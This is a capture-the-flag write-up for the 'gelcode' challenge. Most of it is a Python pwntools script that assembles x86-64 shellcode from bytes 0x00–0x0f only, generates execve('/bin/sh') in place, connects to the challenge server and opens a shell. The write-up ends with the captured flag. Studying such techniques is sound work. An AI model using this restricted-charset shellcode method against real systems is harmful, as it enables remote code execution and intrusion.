The challenge binary is simple - it reads `1000` bytes intoa buffer that has read, write and execute permissions, then sets any bytes greater than `0xf` to `0` and calls the read data directly. This just means that no byte > `0xf` can be used in the shellcode.

My original idea was to get a `read` syscall to read unfiltered shellcode into the buffer, but both `read` and `write` refused to work for  some reason. The solution below generates the shellcode in-place.

Script:

```python3
from pwn import *

# only allowed bytes in the input are 0x0 through 0xf
# this corresponds to 15 instructions, the most useful of which is ADD
# some reference from
# http://www.c-jump.com/CIS77/CPU/x86/X77_0060_mod_reg_r_m_byte.htm
# * the direction bit can be controlled
# * the size bit can be controlled
# * MOD is always 0b00
# * for two-register ADD, exactly one (includes rip) is dereferenced (indirect)
#   and the other one is either al/rax or cl/rcx
# * can add immediate values to al / eax!

# generate instructions
# goal: get execve
# rax = 59  ; execve
# rsi = 0
# rcx = 0
# rdi = "/bin/sh"

# however, generating instructions takes a lot of additions

# eax is easy to set
# other values are slightly more difficult

# some primitives that can be constructed using the allowed characters

class AddAtRIP:
    def __init__(self, offset=0):
        self.offset = offset

    def __len__(self):
        return 6

    def construct(self):
        return b"\x01\x05" + p32(self.offset)

class AddRAX:
    def __init__(self, val=0):
        self.val = val
        
    def __len__(self):
        return 5

    def construct(self):
        return b"\x05" + p32(self.val)

class AddRDXp:
    def __len__(self):
        return 2

    def construct(self):
        return b"\x01\x02"

class AddRCX:
    def __len__(self):
        return 2

    def construct(self):
        return b"\x03\x0a"
    
class ZeroPad:
    def __init__(self, l=4):
        self.l = l
        
    def __len__(self):
        return self.l

    def construct(self):
        return b"\x00" * self.l
    
# keep track of registers
rax = 0

# concatenate instructions to a row of bytes
def join(instr):
    return b"".join(i.construct() for i in instr)

def getByte(v, i):
    return (v >> (i*8)) & 0xff

def shiftByte(b, i):
    return b << (i*8)

def setReg(curr, v, add):
    instr = []
    d = []
    for bo in range(4):
        bl = []
        ba = getByte(curr, bo)
        bv = getByte(v, bo)
        while ba != bv:
            a = min(0xf, (bv - ba + 0x100) & 0xff)
            bl.append(a)
            curr = (curr + shiftByte(a, bo)) & 0xffffffff
            ba = getByte(curr, bo)
        d.append(bl)
        
    mxl = max(len(bl) for bl in d)

    for bo in range(4):
        d[bo] += [0 for _ in range(mxl - len(d[bo]))]

    for av in zip(*d):
        cv = 0
        for bo in range(4):
            cv += shiftByte(av[bo], bo)
        instr.append(add(cv))
    
    return instr

def setRax(v):
    global rax
    instr = setReg(rax, v, AddRAX)
    rax = v
    return instr

# generate four requested bytes and run them
def generateQuad(q, padding=4):
    instr = []

    # set eax to the requested value
    v = int.from_bytes(q, "little")

    instr += setRax(v)
    rax = v
    
    instr.append(AddAtRIP())
    instr.append(ZeroPad(padding))
    return instr


def setRDXp(v):
    global rdxp, rcx
    instr = []
    
    instr += setRax((v - rdxp + 0x100000000) & 0xffffffff)
    instr.append(AddRDXp())
    rdxp = (rdxp + rax + 0x100000000) & 0xffffffff

    return instr

#r = process(["strace", "-e", "raw=read", "./chal"])
#r = process("./chal")
r = remote("gelcode.hsc.tf", 1337)

r.recvline()

#gdb.attach(r)

p = b""

instr = []

# zero rbx
# this was zero on my machine, but probably just by accient
# xor rbx, rbx; push rbx
instr += generateQuad(bytes.fromhex("4831db53"))
# zero rsi and rcx
# push rbx; pop rsi; push rbx; pop rcx
instr += generateQuad(bytes.fromhex("535e5359"))
print(hex(rax))
rcx = 0

# generate "/bin/sh"
# push rbx; push rbx; push rsp; pop rdx
instr += generateQuad(bytes.fromhex("5353545a"))
rdxp = 0
# now use DWORD/QWORD PTR [rdx] to increment rcx
instr += setRDXp(int.from_bytes("/sh\x00".encode(), "little"))
instr.append(AddRCX())
instr += setRDXp(int.from_bytes("/bin".encode(), "little"))
# shl rcx, 32
instr += generateQuad(bytes.fromhex("48c1e120"))
# push rbx; add rcx, QWORD PTR [rdx]
instr += generateQuad(bytes.fromhex("5348030a"))

# finish setup
# push rbx; push rbx; pop rdx; pop rdx
instr += generateQuad(bytes.fromhex("53535a5a"))
# push rcx; push rsp; push 59
instr += generateQuad(bytes.fromhex("51546a3b"))
# pop rax; pop rdi; syscall
instr += generateQuad(bytes.fromhex("585f0f05"))

p += join(instr)

# account for the newline
p += b'a' * (999 - len(p))
print(p)
r.sendline(p)

# shell!
r.interactive()

```

This creates a shell, where running `cat flag` gives the flag: `flag{bell_code_noughttwoeff}`.
